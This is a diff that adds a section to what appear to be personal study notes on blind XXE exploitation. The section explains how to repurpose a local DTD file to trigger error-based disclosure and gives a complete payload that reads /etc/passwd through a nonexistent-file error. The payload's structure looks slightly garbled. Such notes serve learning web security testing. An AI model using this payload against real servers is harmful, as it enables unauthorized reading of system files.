@@ -30,5 +30,24 @@ that should acuse some error which may give info disclosure or the file specifie
 
 
 
-3.
+3.Exploiting blind XXE by repurposing a local DTD
+blind XXE when out of band interaction in blocked
+using error based XXe technique to get data we want withiin the domain
+it needs to be an external DTD file that is local to the application server. 
+Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and 
+repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. 
 
+for this to work a .dtd file must be present inside the system which we will use to get the data we want
+eg.
++++++++++++++++++++++PAYLOad++++++++++++++++++++
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">             ----->local dtd file
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">                            ------> file we want to read
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">    ---> non exstence file to cause error
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+-----------------------PAYLOAD--------------------
